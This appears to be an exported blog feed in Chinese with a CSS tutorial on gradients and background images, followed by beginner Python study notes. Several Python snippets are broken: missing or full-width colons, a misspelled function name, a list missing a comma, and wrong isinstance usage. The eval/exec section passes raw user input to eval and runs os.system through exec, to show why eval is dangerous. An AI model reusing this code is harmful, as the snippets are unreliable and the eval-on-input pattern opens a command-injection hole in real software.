href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Using_CSS_gradients" target="_blank" rel="noopener">MDN</a>, 有兴趣的同学可以仔细学习下。</p><p>在使用网易云音乐网页版的时候，<strong>每日推荐</strong>是我们很常用的一个功能，<br>如下图所示，会显示当前的星期数和日期.<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/1-gradient/5.jpeg" alt="image"><br>在网易云音乐源码中，该元素是用图片实现的，太简单了。我们要挑战下，尝试使用本节学习的背景颜色和渐变实现这个效果。</p><p><strong>标注</strong><br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/1-gradient/6.png" alt="image"></p><p><strong>思路</strong></p><ol><li>页面可以分为3部分，头部红色区域，中间数字区域，数字区域的蒙层</li><li>头部区域背景颜色是一个自上而下的渐变色，头部区域注意文字有阴影<br>效果</li><li><strong>蒙层区域需要浮在数字.上面，而不是整个容器，需需要使用绝对定位</strong></li><li>蒙层区域需要使用百分比定位渐变色</li></ol><p><strong>字体</strong><br>这里数字字体很特殊，需要设置<code>font-family</code></p><pre><code>font-family: Arial, Helvetica, sans-serif;</code></pre><p><strong>圆角</strong></p><p>我们可以选择性的设置容器4个角圆角属性</p><pre><code>border-top-left-radius: 2px; /*只设置左上角的圆角*/border-top-right-radius: 2px; /*只设置右上角的圆角*/border-bottom-left-radius: 2px; /*只设置左下角的圆角*/border-bottom-right-radius: 2px; /*只设置右下角的圆角*/</code></pre><p>代码：</p><p>CSS：</p><pre><code>.box {  position: relative;  width: 140px;  height: 140px;  border-radius: 4px;  overflow: hidden;}.head {  height: 33px;  line-height: 33px;  color: #fed9d9;  font-size: 14px;  text-align: center;  background: linear-gradient(to bottom, #d94747, #b9191a);}.date {  height: 107px;  line-height: 107px;  text-align: center;  font-size: 94px;  font-family: Arial, Helvetica, sans-serif;  font-weight: bold;  color: #202020;}.mask {  position: absolute;  top: 33px;  left: 0;  right: 0;  bottom: 0;  background: linear-gradient(    to bottom,    rgba(0, 0, 0, 0.05),    rgba(0, 0, 0, 0.15) 50%,    rgba(0, 0, 0, 0.05) 50%,    rgba(0, 0, 0, 0.15) 100%  );}</code></pre><p>HTML：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset="utf-8" /&gt;    &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;    &lt;title&gt;每日推荐&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div class="box"&gt;      &lt;div class="head"&gt;星期二&lt;/div&gt;      &lt;div class="date"&gt;17&lt;/div&gt;      &lt;div class="mask"&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="10-2背景图片"><a href="#10-2背景图片" class="headerlink" title="10.2背景图片"></a>10.2背景图片</h3><p>CSS除了设置背景颜色，还可以设置背景图片,背景图片在网页中使用十分常见。我们来看-下网上一些背景图片使用案例。</p><ol><li>微博个人主页<a href="https://weibo.com/u/1350995007头部区域和整个页面背景" target="_blank" rel="noopener">https://weibo.com/u/1350995007头部区域和整个页面背景</a><br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/2.png" alt="image"></li><li>网易云音乐客户端下载区域<a href="https://music.163.com/" target="_blank" rel="noopener">https://music.163.com/</a><br><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/3.png" target="_blank" rel="noopener">https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/3.png</a></li></ol><h4 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h4><p>实现<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/4.png" alt="image"></p><blockquote><p>一个容器中，有一串HELLO WORLD字，同时有一张居中的优课达LOGO的背景图。</p></blockquote><p>原始HTML</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="utf-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;div class="box"&gt;    HELLO WORLD  &lt;/div&gt;&lt;/body&gt;</code></pre><p>原始CSS</p><pre><code>.box {  width: 100%;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;}</code></pre><p>下面我们给box元素设置背景图片<br><a href="https://style.youkeda.com/img/ykd-components/logo.png" target="_blank" rel="noopener">https://style.youkeda.com/img/ykd-components/logo.png</a></p><p>首先学习怎么给一个元素设置背景图片<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/6.png" alt="image"></p><p>一个<code>background-image</code>标签,加一个<code>url</code>包裹的远程或者本地图片地址。</p><blockquote><p>注意url里面的图片地址不需要用引号包裹。</p></blockquote><p><strong>1. 背景图片出现了重复</strong></p><p>当背景图片长宽任意一项小于容器的长宽，默认CSS会让图片重复,直到铺满整个容器位置。</p><p>我们可以使用<code>background-repeat: no-repeat;</code>禁止图片的重复，演示一下:</p><pre><code>.box {  width: 100%;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;  background-image: url(https://style.youkeda.com/img/ykd-components/logo.png);  background-repeat: no-repeat;}</code></pre><p>效果：<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/8.png" alt="image"></p><p>我们来完整的学习下<code>background-repeat</code>的值。</p><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>repeat</td><td>这是默认值。如果背景图片比容器小，将在垂直和水平方向进行重复</td></tr><tr><td>repeat-x</td><td>背景图片只在水平方向重复</td></tr><tr><td>repeat-y</td><td>背景图片只在垂直方向重复</td></tr><tr><td>no-repeat</td><td>背景图片将只显示一次,不重复</td></tr></tbody></table><p>演示一下使用repeat-x的情况</p><pre><code>.box {  width: 100%;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;  background-image: url(https://style.youkeda.com/img/ykd-components/logo.png);  background-repeat: repeat-x;}</code></pre><p><strong>2. 背景图片不居中</strong></p><p>默认情况下，背景图片是从容器的左上角开始布局，为了使容器垂直水平居中，我们可以使用<code>background-position: center;</code>解决，到现在为止的完整代码如下:。</p><pre><code>.box {  width: 350px;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;  background-image: url(https://style.youkeda.com/img/ykd-components/logo.png);  background-repeat: no-repeat;  background-position: center;}</code></pre><p>我们来完整的学习下 <code>background-position</code>的值。</p><table><thead><tr><th>值</th><th>描述</th></tr></thead></table><p><code>top left/top center/top right/center left/center center/center right/bottom left/bottom center/bottom right</code>| 左侧两个元素为一组一起出现，分别代表垂直和水平布局<strong>比如:</strong>background-position: top left;效果等于background-position-x: left;background-position-y: top;如果只写一个关键词，那么另一个关键词默认是center<br>%x %y | 第一个值是水平位置，第二个值是垂直位置。<br>左上角是0%0%。右下角是100% 100%。如果只写一个值，另一个值将是50%。<br>xpx ypx | 第一个值是水平位置，第二个值是垂直位置。左上角是00，单位是像素(0px 0px)或任何其他的CSS单位。如果只写一个值，另一个值将是50%</p><p>演示一下，把背景图片放在右下角</p><pre><code>.box {  width: 100%;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;  background-image: url(https://style.youkeda.com/img/ykd-components/logo.png);  background-repeat: no-repeat;  background-position: bottom right;}</code></pre><h4 id="高级特性"><a href="#高级特性" class="headerlink" title="高级特性"></a>高级特性</h4><p><strong>背景图片撑满整个容器</strong></p><p>在上面的基础上，我们希望背景图片放大撑满整个容器,如下图所示:<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/9.png" alt="image"></p><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>cover</td><td>把背景图像扩展至足够大，以使背景图像完全覆盖背景区域。背景图像的某些部分也许无法显示在背景定位区域中。</td></tr><tr><td>contain</td><td>把图像图像扩展至最大尺寸,以使其宽度和高度完全适应内容区域。</td></tr><tr><td>xpx ypx</td><td>手动设置宽度和高度</td></tr><tr><td>%x %y</td><td>手动设置宽度和高度相对于容器的百分比</td></tr></tbody></table><p>通过描述，我们想想要实现.图效果，我们应该选用那个值?</p><p>如果还是不知道，不如我们直接用代码试一下。前端开发的好处，可以直接在线测试。</p><p>演示设置为<code>contain</code></p><pre><code>.box {  width: 100%;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;  background-image: url(https://style.youkeda.com/img/ykd-components/logo.png);  background-repeat: no-repeat;  background-position: center;  background-size: contain;}</code></pre><p>演示设置为<code>cover</code></p><pre><code>.box {  width: 100%;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;  background-image: url(https://style.youkeda.com/img/ykd-components/logo.png);  background-repeat: no-repeat;  background-position: center;  background-size: cover;}</code></pre><p>我们分别把<code>position-size</code>设置为<code>contain cover</code></p><p>效果很明显，左边contain是我们想要的效果。回过头来，我们再仔细分析下这两个值的区别，其实也比较容易理解:</p><blockquote><p>cover就是满足图片长宽中较小的一方撑满屏幕。</p></blockquote><blockquote><p>contain就是满足图片 长宽中较大的一方撑满屏幕。</p></blockquote><p><strong>background合并写法</strong></p><pre><code>.box {  width: 350px;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;  background-image: url(https://style.youkeda.com/img/ykd-components/logo.png);  background-repeat: no-repeat;  background-size: contain;  background-position: center;}</code></pre><p>下面4条都用于背景图片布局，会不会觉得很繁琐?在CSS中对于背景有一种非常简单书写的方式</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/12.png" alt="image"></p><blockquote><p>在background后连续跟随多个背景属性值，如果没有此属性，则置空。在上面例子中，我们会使用<code>background-image``background-repeat</code>，<code>background-position</code>，<code>background-size</code>四个属性，合并之后的结果是:</p></blockquote><pre><code>.box {  width: 350px;  height: 250px;  border: 1px solid #e8e8e8;  font-size: 30px;  font-weight: bold;  color: yellowgreen;  background: url(https://style.youkeda.com/img/ykd-components/logo.png)    no-repeat center / contain;}</code></pre><p>其他属性：<br>position-attachment:<a href="https://developer.moilla.org/zh-CN/docs/Web/CSS/background-attachment" target="_blank" rel="noopener">https://developer.moilla.org/zh-CN/docs/Web/CSS/background-attachment</a></p><p>position-clip：<a href="https://developer.moilla.org/zh-CN/docs/Web/CSS/background-clip" target="_blank" rel="noopener">https://developer.moilla.org/zh-CN/docs/Web/CSS/background-clip</a></p><p>这两个属性大家可以简单阅读下，不是重点。</p><p>作业1：</p><p>在上一节基础上，我们继续完善网易云音乐个人推荐页banner效果，如下图所示<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/13.png" alt="image"></p><p><strong>提示</strong></p><ol><li>已经内置了上一节的标准答案，大家可以仔细阅读下</li><li>为了防止容器留白，一般背景图片会使用cover</li></ol><p><strong>标注</strong></p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/14.png" alt="image"></p><p><strong>图片资源</strong></p><p>背景图片: <a href="https://document.youkeda.com/P3-1-HTML-CSS/1.9/music-bg.jpg" target="_blank" rel="noopener">https://document.youkeda.com/P3-1-HTML-CSS/1.9/music-bg.jpg</a> </p><p>CSS</p><pre><code>.banner {  background-image: url(https://document.youkeda.com/P3-1-HTML-CSS/1.9/music-bg.jpg);  background-size: cover;  padding-left: 48px;  padding-top: 30px;  box-sizing: border-box;  width: 715px;  height: 200px;}.box {  position: relative;  width: 140px;  height: 140px;  border-radius: 4px;  overflow: hidden;}.head {  height: 33px;  line-height: 33px;  color: #fed9d9;  font-size: 14px;  text-align: center;  background: linear-gradient(to bottom, #d94747, #b9191a);}.date {  background-color: white;  height: 107px;  line-height: 107px;  text-align: center;  font-size: 94px;  font-family: Arial, Helvetica, sans-serif;  font-weight: bold;  color: #202020;}.mask {  position: absolute;  top: 33px;  left: 0;  right: 0;  bottom: 0;  background: linear-gradient(    to bottom,    rgba(0, 0, 0, 0.05),    rgba(0, 0, 0, 0.15) 50%,    rgba(0, 0, 0, 0.05) 50%,    rgba(0, 0, 0, 0.15) 100%  );}</code></pre><p>HTML：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset="utf-8" /&gt;    &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;    &lt;title&gt;每日推荐&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div class="banner"&gt;      &lt;div class="box"&gt;        &lt;div class="head"&gt;星期二&lt;/div&gt;        &lt;div class="date"&gt;17&lt;/div&gt;        &lt;div class="mask"&gt;&lt;/div&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>作业2：<strong>微博Banner</strong></p><p>在本节课中，我们需要完成微博轮播图视觉效果们看看微博的页，如下图高亮区域<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.10/2-background/15.png" alt="image"></p><p>我们分解下banner区域，暂时不需要做滚动播放(以后学习JS,再完成这部分功能)。</p><ol><li>banner区域由-张文章大图和一段文章描述组成</li><li>文章描述包含标题、讨论数、阅读量组成</li><li>文章描述背后有一段渐变的蒙层<br>具体的标注如下:<br><img src="https://note.youdao.com/favicon.ico" alt="image"></li></ol><p>背景图片资源<br><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.9/weibo-banner.jpg" target="_blank" rel="noopener">https://document.youkeda.com/P3-1-HTML-CSS/1.9/weibo-banner.jpg</a></p><p>CSS：</p><pre><code>.banner {  position: relative;  width: 600px;  height: 300px;  background-image: url(https://document.youkeda.com/P3-1-HTML-CSS/1.9/weibo-banner.jpg);  background-size: cover;}.info {  float: left;}.main {  position: absolute;  bottom: 0;  left: 0;  right: 0;  height: 60px;  padding-left: 10px;  color: #fff;  background: linear-gradient(to bottom, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.9));}.title {  margin-top: 10px;  font-size: 18px;  font-weight: 700;  line-height: 20px;}.ext {  margin-top: 4px;  font-size: 12px;  line-height: 20px;}.discuss {  margin-right: 20px;}</code></pre><p>HTML：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="UTF-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;title&gt;微博&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;div class="banner"&gt;    &lt;div class="main"&gt;      &lt;div class="info"&gt;        &lt;div class="title"&gt;          #一直单身但颜值超高的人#        &lt;/div&gt;        &lt;div class="ext"&gt;          &lt;span class="discuss"&gt;1.4万讨论&lt;/span&gt;          &lt;span class="read"&gt;2443.3万阅读&lt;/span&gt;        &lt;/div&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/body&gt;</code></pre><h2 id="第十一章：实战"><a href="#第十一章：实战" class="headerlink" title="第十一章：实战"></a>第十一章：实战</h2><p>学到这里，相信大家已经收获满满了。接下来我们做一个完整了页面，为本课程画上完美的句号。</p><h5 id="作业描述"><a href="#作业描述" class="headerlink" title="作业描述"></a>作业描述</h5><p>在之前我们完成了QQ注册页的头部的开发，本次作业是完成整个QQ注册页的开发，如下图所示:<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.11/demo.png" alt="image"></p><p><strong>标注</strong></p><p>本次作业设计稿地址<br><a href="https://www.figma.com/file/QlB3P8eWLONdMhfRxirqVw/QQ%E6%B3%A8%E5%86%8C%E9%A1%B5?node-id=1%3A137" target="_blank" rel="noopener">QQ头部设计稿</a></p><p><strong>分析</strong></p><p>整个页面主题由3部分组成-<strong>头部区域，主体左侧背景区域，主体右侧表单区域</strong>，如图: </p><p><img src="http://document.youkeda.com/P3-1-HTML-CSS/1.11/analysis.png" alt="image"></p><p><strong>1、头部区域</strong></p><p>头部区域是一个fixed在顶部的容器，之前已经完成了，这里不多说，代码中已经加入头部答案，大家可以仔细看看。</p><p><strong>2、左侧区域</strong></p><p>在真实的QQ注册页面中，左侧图片是响应式的(也就是在不同浏览器宽度中，显示效果不同)。本课程还未学习这部分知识，我们暂时只适配最宽的情况，也就是宽度永远固定为480px.</p><p><strong>3、右侧区域</strong></p><p>右侧区域是占满整个浏览器除开左侧图片的剩余宽度，这里介绍一个新知识，可以使用CSS<code>calc</code>通过计算得到宽度，在这里可以使用</p><pre><code>width: calc(100% - 480px); /*表示整个宽度100%减去480px*/</code></pre><p>右侧区域中心的表单是在整个右侧区域中<strong>左右上下居中</strong>，需要用到之前学习的模态框知识，如何让容器左右.上下居中?</p><p>整体分析下来，如下图示意图所示:</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.11/layout.png" alt="image"></p><p><strong>图片资源</strong></p><p><a href="http://document.youkeda.com/P3-1-HTML-CSS/1.11/bg.png" target="_blank" rel="noopener">左侧背景图片</a></p><p>CSS</p><pre><code>html,body {  height: 100%;  margin: 0;}ul,li {  margin: 0;  padding: 0;}li {  list-style: none;}h1,h2 {  margin: 0;}p {  margin: 0;  padding: 0;}/* 浏览器都有自己的默认样式，以上部分为清除浏览器默认样式 */.nav {  position: fixed;  top: 0;  left: 0;  right: 0;  padding: 0 20px;}a.qq {  margin-left: 10px;  margin-top: 20px;  float: left;  cursor: pointer;  font-size: 0;}a.qq &gt; img {  width: 40px;  height: 40px;  vertical-align: middle;}a.qq &gt; span {  vertical-align: middle;  font-size: 36px;  line-height: 43px;  margin-left: 6px;}ul.right {  float: right;}ul.right &gt; li {  float: left;  margin-top: 20px;  margin-right: 40px;  font-size: 16px;  line-height: 24px;  cursor: pointer;}.bright {  width: 95px;  height: 34px;}.bright &gt; img {  width: 100%;  height: 100%;}ul.right &gt; li.language {  font-size: 0;  margin-top: 30px;}ul.right &gt; li.language span {  font-size: 16px;  vertical-align: middle;}ul.right &gt; li.language .arrow {  vertical-align: middle;  width: 12px;  height: 8px;}ul.right &gt; li.contact {  margin-top: 30px;}/*上面是QQ注册页头部CSS*/.main {  height: 100%;  overflow: hidden;}.bg {  float: left;  width: 480px;  height: 100%;  background: url(http://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.11/bg.png);  background-position: center;  background-repeat: no-repeat;  background-size: cover;}.content {  position: relative;  box-sizing: border-box;  width: calc(100% - 480px);  margin-left: 480px;  height: 100%;  overflow: hidden;}.core {  width: 480px;  height: 571px;  position: absolute;  left: 50%;  top: 50%;  margin-left: -240px;  margin-top: -285.5px;}h1 {  font-size: 44px;  line-height: 62px;  font-weight: normal;}.subtitle {  margin-top: 13px;  height: 34px;}h2 {  font-size: 27px;  line-height: 34px;  font-weight: normal;  float: left;}.free-bright {  float: right;  font-size: 23px;  line-height: 34px;  color: #359eff;  cursor: pointer;}form {  margin-top: 63px;}select,input {  box-sizing: border-box;  width: 480px;  height: 52px;  border: 1px solid #aaaaaa;  border-radius: 4px;  padding: 15px 20px;  font-size: 19px;}.mobile,input.password {  margin-top: 32px;}.mobile &gt; select {  width: 154px;  background-color: white;  outline: none;}.mobile &gt; input {  width: 307px;  float: right;}::placeholder {  color: #aaaaaa;  font-size: 19px;  font-weight: normal;}.mobile-tip {  margin-top: 10px;  font-size: 13px;  line-height: 14px;  color: #999;}.submit {  margin-top: 38px;  width: 480px;  box-sizing: border-box;  height: 60px;  background-color: #3487ff;  border: 1px solid #3083ff;  box-sizing: border-box;  box-shadow: 0px 5px 8px rgba(24, 95, 255, 0.1);  border-radius: 4px;  outline: none;  font-weight: 200;  font-size: 24px;  line-height: 60px;  color: #ffffff;  cursor: pointer;}.agreement {  margin-top: 32px;  font-size: 13px;  line-height: 30px;  color: #aaaaaa;}.agreement &gt; input {  width: 18px;  height: 18px;  vertical-align: middle;  padding: 0;  margin: 0;}.agreement &gt; label {  vertical-align: middle;}footer {  position: absolute;  width: 344px;  bottom: 26px;  left: 50%;  margin-left: -172px;  font-size: 14px;  line-height: 20px;  text-align: center;  color: #bbbbbb;}</code></pre><p>HTML</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="UTF-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;title&gt;QQ注册&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;nav class="nav"&gt;    &lt;a class="qq"&gt;      &lt;img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/qq.png" /&gt;      &lt;span&gt;QQ&lt;/span&gt;    &lt;/a&gt;    &lt;ul class="right"&gt;      &lt;li class="bright"&gt;        &lt;img          src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/bright.png"          alt="QQ靓号"        /&gt;      &lt;/li&gt;      &lt;li class="language"&gt;        &lt;span&gt;简体中文&lt;/span&gt;        &lt;img          class="arrow"          src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/arrow-down.png"        /&gt;      &lt;/li&gt;      &lt;li class="contact"&gt;意见反馈&lt;/li&gt;    &lt;/ul&gt;  &lt;/nav&gt;  &lt;main class="main"&gt;    &lt;div class="bg"&gt;&lt;/div&gt;    &lt;div class="content"&gt;      &lt;div class="core"&gt;        &lt;h1&gt;欢迎注册QQ&lt;/h1&gt;        &lt;div class="subtitle"&gt;          &lt;h2&gt;每一天，乐在沟通。&lt;/h2&gt;          &lt;a class="free-bright"&gt;免费靓号&lt;/a&gt;        &lt;/div&gt;        &lt;form action=""&gt;          &lt;input type="text" placeholder="昵称" /&gt;          &lt;input class="password" type="password" placeholder="密码" /&gt;          &lt;div class="mobile"&gt;            &lt;select&gt;              &lt;option&gt;+86&lt;/option&gt;              &lt;option&gt;+852&lt;/option&gt;            &lt;/select&gt;            &lt;input type="text" placeholder="手机号码" /&gt;          &lt;/div&gt;          &lt;p class="mobile-tip"&gt;可通过该手机号找回密码&lt;/p&gt;          &lt;button class="submit"&gt;立即注册&lt;/button&gt;          &lt;div class="agreement"&gt;            &lt;input type="checkbox" /&gt;            &lt;label&gt;我已阅读并同意相关服务条款和隐私政策&lt;/label&gt;          &lt;/div&gt;        &lt;/form&gt;      &lt;/div&gt;      &lt;footer&gt;Copyright © 1998-2019Tencent All Rights Reserved&lt;/footer&gt;    &lt;/div&gt;  &lt;/main&gt;&lt;/body&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web前端基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python自学day2</title>
      <link href="/2020/08/01/pyday2/"/>
      <url>/2020/08/01/pyday2/</url>
      
        <content type="html"><![CDATA[<h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>1、当装饰器的东西要放上面</p><p>2、引用装饰器，先运行装饰器</p><pre><code>import timedef timer(fun):    def inner():        start = time.time()   #获取当前时间        fun()        print(time.time()-start)        pass    return inner    pass@timer    #把func1放到timer里执行def func1():    print("I am func1")    passfunc1()</code></pre><p>装饰器传参</p><pre><code>import timedef timer(fun):     #此处传入的是func1    def inner(a):   #此处传入的是参数a    #可见func1和a是分开传进的，要两个参数接收        start = time.time()   #获取当前时间        fun(a)        print(time.time()-start)        pass    return inner    pass@timerdef func1(a):    print(a)    time.sleep(2)     #停止两秒    passfunc1("Haha,I am func1")</code></pre><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><pre><code>##使用迭代器，迭代器必须遵守得迭代器协议，必须有iter和next方法from collections import Iterablel = [1,2,3,4]t = (1,2,3,4)d = {1,2,3,4}s = {1,2,3,4}print(isinstance,(t,Iterable))  #如果是true，说明可以被迭代l_iter = l.__iter__() #开始使用迭代器去迭代item = l_iter.__next__()  #迭代一个print(item)item2 = l_iter.__next__()print(item2)  #知道没东西可以迭代</code></pre><pre><code>#自动迭代l = [1,2,3,4]l_iter = l.__iter__()while True    try:#用try包裹起来的东西，正常执行没问题，如果报错了，就执行except的内容        item = l_iter.__next__()        print(item)    except:        print("迭代结束，break")        break</code></pre><hr><pre><code>#python统一格式#-*- coding=utf-8 -*-def main()：    passif __name__=='__main__':    main()</code></pre><hr><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><pre><code>def gen_fun1():    a = 1    print("将a赋值")    yield a   #整个程序中断，并且把a return出去    b = 2    print("将b赋值")    yield b    passdef main()    g1 = gen_fun1() #函数执行，内存地址给g1    print(g1,next(g1))    print(next(g1)) #g1继续执行    pass</code></pre><pre><code>#实例:控制生成器批量生成def produce():    for i in range(100):        yield "上产了%s个包子"%i    passdef main():    p = prduce()    num = 0    for i in p:  #此时p.__next__()就是i        print(i) #调用了yield        num +=1        if num == 12:        break    passif __name__=='__main__'    main()=====第二种======def produce():    for i in range(100):        yield "上产了%s个包子"%i    passdef main():    p = prduce()    num = 0    for i in range(12):          print(p.__next__())     passif __name__=='__main__'    main()</code></pre><pre><code>#给yield传入参数def gen():    print(123)    content = yield 1 #中断函数，return1，把send内容给content    print("=======",content)    print(456)    yield 2    passdef main():    g = gen()    ret = g.__next__()    print("***",ret)    ret2 = g.send("hahaha i am coming")    print("***",ret2)    pass</code></pre><hr><h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><pre><code>#求30以内能被3整除的数,再进行平方#利用函数的列表推导式#-*- coding=utf-8 -*-def squard(x):    return x*xdef main():    #列表推导式    mul = [squard(i) for i in range(30) if i % 3 is 0]    print(mul)    passif __name__=='__main__':    main()</code></pre><pre><code>#-*- coding=utf-8 -*-def main():    #列表推导式    fruits = [['apple','banana','orange','almond','chestnut','data','coconut']['fig','hazel','grape','greengage','haw','kunquat']]    #找到上面嵌套列表名字包含两个a的水果名字    print([name for lst in fruits for name in lst if name.count('a')&gt;=2])    passif __name__=='__main__':    main()</code></pre><hr><h3 id="字典推导式"><a href="#字典推导式" class="headerlink" title="字典推导式"></a>字典推导式</h3><pre><code>#把字典的键和值互换#-*- coding=utf-8 -*-def main():    dic1 = {'a':1,'b':2}    dic2 = {dic1[k]:k for k in dic1}    print(dic2)    passif __name__=='__main__':    main()</code></pre><hr><h3 id="集合推导式"><a href="#集合推导式" class="headerlink" title="集合推导式"></a>集合推导式</h3><pre><code>#-*- coding=utf-8 -*-def main():    li = [1,2,3,4,-1,-2]    s = {x**2 for x in li}    print(s)    passif __name__=='__main__':    main()</code></pre><hr><h3 id="python的内置函数"><a href="#python的内置函数" class="headerlink" title="python的内置函数"></a>python的内置函数</h3><p>eval:执行字符串所代表的代码，并返回结果<br>eval很危险，因为会把传入的字符串当作python代码执行！！</p><pre><code>#-*- coding=utf-8 -*-def main():    ret = eval('2+2') #2+2    print(ret)    passif __name__=='__main__':    main()</code></pre><pre><code>import os#-*- coding=utf-8 -*-def main():    a = input("please input your name")    print("your name is:",a)    eval(a)    #eval('os.system("ipconfig")')，把这个字符串当作py代码来执行    passif __name__=='__main__':    main()</code></pre><p>exec:执行</p><pre><code>#-*- coding=utf-8 -*-def main():    s = 'os.system("dir")'    exec(s)    passif __name__=='__main__':    main()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python自学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python自学笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python自学day3</title>
      <link href="/2020/08/01/pyday3/"/>
      <url>/2020/08/01/pyday3/</url>
      
        <content type="html"><![CDATA[<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>每一个.py文件<br>新建test1234.py文件</p><pre><code>#-*- coding=utf-8 -*-print("i am")money = 100def fun1():    print("my money:",money)def fun3():    print("i am fun3")</code></pre><pre><code>#-*- coding=utf-8 -*-import test1234   #引入外部的文件#import test1234 as nndef main()：    test1234.fun1()     #调用fun1()    # nn.fun1();    print(test1234.money)   #打印test1234的money    passif __name__=='__main__':    main()</code></pre><p>只引用一部分</p><pre><code>from test1234 import fun1   #只导入一个文件，亦可以使用,导入多个#-*- coding=utf-8 -*-def main()：    fun1 #直接写    passif __name__=='__main__':    main()</code></pre><pre><code>#-*- coding=utf-8 -*-#在被引用的py文件里，考虑增加这个，限制对方访问某些方法__all__=['fun1','fun2'] #关键字__all__,别人只能引用我的fun1和fun2，print("i am")money = 100def fun1():    print("my money:",money)def fun2():    print("i am fun2")def fun3():    print("i am fun3")</code></pre><hr><h2 id="包-packet"><a href="#包-packet" class="headerlink" title="包(packet)"></a>包(packet)</h2><p>新建目录</p><p>新建文件加，文件加里面必须包含名字为<strong>init</strong>.py的文件！！！！</p><p>引入包<br><code>import pa.test</code></p><p>使用包内的模块的函数<br><code>pa.test.fun1()</code></p><hr><p><strong>python自带的模块</strong></p><p>json模块</p><pre><code>#-*- coding=utf-8 -*-import jsondef main()：    dic = {'k1':'v1','k2':'v2','k3':'v3'}    str = json.dumps(dic)   #将一个字典转化为字符串（将字典序列化）    print(type(str))    dic2 = json.loads(str)  #反序列化,json格式转化为字典    print(dic2)    passif 